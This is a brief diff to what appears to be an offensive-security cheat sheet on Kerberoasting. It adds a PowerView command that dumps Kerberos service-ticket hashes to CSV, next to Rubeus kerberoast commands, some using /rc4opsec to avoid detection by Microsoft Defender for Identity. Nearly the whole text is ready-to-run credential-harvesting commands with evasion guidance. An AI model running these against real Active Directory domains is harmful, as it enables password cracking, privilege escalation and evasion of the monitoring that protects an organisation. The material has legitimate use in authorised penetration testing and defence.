@@ -30,6 +30,10 @@ Rubeus.exe kerberoast /stats
 Rubeus.exe kerberoast /user:username /simple
 ```
 
+```powershell title:"Alternative: Request TGS using PowerView.ps1"
+Invoke-Kerberoast | select Hash | ConvertTo-Csv
+```
+
 ```batch title:"To avoid detections based on Encryption Downgrade for Kerberos EType (used by likes of MDI - 0x17 stands for rc4-hmac), look for Kerberoastable accounts that only support RC4_HMAC"
 Rubeus.exe kerberoast /stats /rc4opsec
 Rubeus.exe kerberoast /user:username /simple /rc4opsec
